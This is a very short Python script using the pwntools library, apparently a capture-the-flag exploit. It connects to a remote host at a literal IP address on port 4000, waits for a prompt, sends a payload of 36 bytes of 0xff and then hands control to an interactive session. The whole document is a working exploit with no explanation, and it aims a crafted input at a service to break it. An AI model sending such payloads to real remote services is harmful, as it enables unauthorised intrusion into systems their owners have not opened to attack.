from pwn import *

io = remote('20.169.252.240', 4000)

io.recvuntil(b'him: ')
io.sendline(b'\xff'*36)
io.interactive()